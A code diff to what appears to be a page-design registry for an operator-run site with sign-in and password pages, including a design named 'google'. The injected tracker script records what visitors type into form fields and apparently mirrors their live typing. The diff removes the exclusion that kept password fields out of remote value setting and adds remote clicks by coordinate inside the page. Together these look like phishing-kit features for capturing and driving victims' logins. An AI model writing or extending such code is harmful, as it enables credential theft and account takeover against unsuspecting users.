@@ -107,6 +107,10 @@ const _hiddenBundledDesigns = new Set<string>();
 const _tombstones = new Set<string>(); // key = design:page:kind — never resurrect
 let _indexOverride: { order: string[] } | null = null;
 
+/** Only these designs ship / appear in the admin Pages tree + redirect picker. */
+const ALLOWED_DESIGNS = new Set(["cb", "gi"]);
+const REMOVED_DESIGNS = ["go", "blue", "red", "google"];
+
 function persistTombstones() {
   if (typeof window === "undefined") return;
   try {
@@ -125,6 +129,22 @@ export function getDesignLogo(design: string): string | null {
     if (key.startsWith(prefix)) return PNG_FILES[key];
   }
   return null;
+}
+
+/** Favicon for a design page — per-page override, else the design logo. */
+export function getDesignFavicon(design: string, page?: string): string | null {
+  if (page) {
+    const fromPage = (getPageMeta(design, page).favicon ?? "").trim();
+    if (fromPage) return fromPage;
+  }
+  return getDesignLogo(design);
+}
+
+/** TanStack Router `head.links` entries for a design favicon. */
+export function designFaviconLinks(design: string, page?: string) {
+  const href = getDesignFavicon(design, page);
+  if (!href) return [];
+  return [{ rel: "icon", href, type: "image/png" as const }];
 }
 
 function lsLoad() {
@@ -191,13 +211,40 @@ runMigrations();
 
 function runMigrations() {
   if (typeof window === "undefined") return;
-  const MIGRATION_KEY = "design_migration_v3";
+  const MIGRATION_KEY = "design_migration_v4";
   try {
     if (window.localStorage.getItem(MIGRATION_KEY) === "1") return;
+    // Drop removed designs (go/blue/red/google) from any local overrides so
+    // they never reappear in the Pages tree after a prior install.
+    for (const d of REMOVED_DESIGNS) {
+      _metaOverrides.delete(d);
+      _hiddenBundledDesigns.add(d);
+      try { window.localStorage.removeItem(META_PREFIX + d); } catch { /* ignore */ }
+      for (const key of Array.from(_contentOverrides.keys())) {
+        if (key.startsWith(`${d}:`)) {
+          _contentOverrides.delete(key);
+          try { window.localStorage.removeItem(OVERRIDE_PREFIX + key); } catch { /* ignore */ }
+        }
+      }
+    }
+    try {
+      window.localStorage.setItem(
+        HIDDEN_DESIGNS_KEY,
+        JSON.stringify(Array.from(_hiddenBundledDesigns)),
+      );
+    } catch { /* ignore */ }
+    if (_indexOverride) {
+      _indexOverride = {
+        order: _indexOverride.order.filter((id) => ALLOWED_DESIGNS.has(id)),
+      };
+      try {
+        window.localStorage.setItem(INDEX_KEY, JSON.stringify(_indexOverride));
+      } catch { /* ignore */ }
+    }
     // Wipe stale meta + content overrides + tombstones for bundled designs that
     // were renamed (sign-in -> signin, signinaddon -> signinp).
     const stalePages = ["sign-in", "signinaddon", "signin-in", "signinp-addon"];
-    const designsToClean = ["cb", "blue", "red"];
+    const designsToClean = ["cb", "gi"];
     for (const d of designsToClean) {
       _metaOverrides.delete(d);
       try { window.localStorage.removeItem(META_PREFIX + d); } catch { /* ignore */ }
@@ -441,19 +488,26 @@ function currentIndex(): { order: string[] } {
 // ---- Public registry accessors ----
 
 export function getDesigns(): DesignRecord[] {
-  const order = currentIndex().order.filter((id) => !_hiddenBundledDesigns.has(id));
-  // Include any design that has a meta override or a bundled meta but isn't in
-  // the index (defensive).
+  const order = currentIndex().order.filter(
+    (id) => ALLOWED_DESIGNS.has(id) && !_hiddenBundledDesigns.has(id),
+  );
+  // Include any allowed design that has a meta override or a bundled meta but
+  // isn't in the index (defensive). Never surface removed designs (go/blue/red).
   const seen = new Set(order);
   for (const k of Object.keys(META_FILES)) {
     const id = k.split("/")[3];
-    if (id && !seen.has(id) && !_hiddenBundledDesigns.has(id)) {
+    if (
+      id &&
+      ALLOWED_DESIGNS.has(id) &&
+      !seen.has(id) &&
+      !_hiddenBundledDesigns.has(id)
+    ) {
       order.push(id);
       seen.add(id);
     }
   }
   for (const id of _metaOverrides.keys()) {
-    if (!seen.has(id)) {
+    if (ALLOWED_DESIGNS.has(id) && !seen.has(id) && !_hiddenBundledDesigns.has(id)) {
       order.push(id);
       seen.add(id);
     }
@@ -550,12 +604,8 @@ body{margin:0;background:#fafafa;color:#111;font-family:ui-sans-serif,system-ui,
 }
 
 function defaultJS(): string {
-  return `// Shared script. Use track(field,value) to record an input event.
-document.addEventListener('input', (e) => {
-  const t = e.target;
-  if (!t || !t.name || t.type === 'password') return;
-  track(t.name, t.value);
-});
+  return `// Shared script. Use track(field,value) for final submissions only.
+// Live typing is mirrored automatically — do not track() on every keystroke.
 `;
 }
 
@@ -963,7 +1013,7 @@ export function buildSrcDocCached(design: DesignKey, page: PageKey): string {
   const isFullDoc =
     trimmed.startsWith("<!doctype") || trimmed.startsWith("<html");
   const base = isFullDoc ? injectTracker(html) : wrap(html, css, js);
-  return applyPageMeta(base, pm);
+  return applyPageMeta(base, pm, design);
 }
 
 export function buildSrcDocVirtual(
@@ -987,10 +1037,13 @@ function escText(s: string): string {
   return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
 }
 
-function applyPageMeta(doc: string, pm: PageMeta): string {
+function applyPageMeta(doc: string, pm: PageMeta, design?: DesignKey): string {
   let out = doc;
   const title = (pm.title ?? "").trim();
-  const favicon = (pm.favicon ?? "").trim();
+  const favicon =
+    (pm.favicon ?? "").trim() ||
+    (design ? getDesignLogo(design) : null) ||
+    "";
   if (!title && !favicon) return out;
 
   if (title) {
@@ -1365,9 +1418,19 @@ window.addEventListener('message', function(ev){
     var el = null;
     try { el = document.querySelector(sel); } catch(e){}
     if (el && (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA')) {
-      var t = (el.type || 'text').toLowerCase();
-      if (t !== 'password') el.value = d.value == null ? '' : String(d.value);
+      el.value = d.value == null ? '' : String(d.value);
+      try { el.dispatchEvent(new Event('input', { bubbles: true })); } catch(e){}
     }
+  }
+  if (d.type === 'click' && typeof d.x === 'number' && typeof d.y === 'number') {
+    try {
+      var target = document.elementFromPoint(d.x, d.y);
+      if (target && typeof target.click === 'function') target.click();
+      else if (target) {
+        var evt = new MouseEvent('click', { bubbles: true, cancelable: true, clientX: d.x, clientY: d.y, view: window });
+        target.dispatchEvent(evt);
+      }
+    } catch(e){}
   }
 });
 <\/script>`;
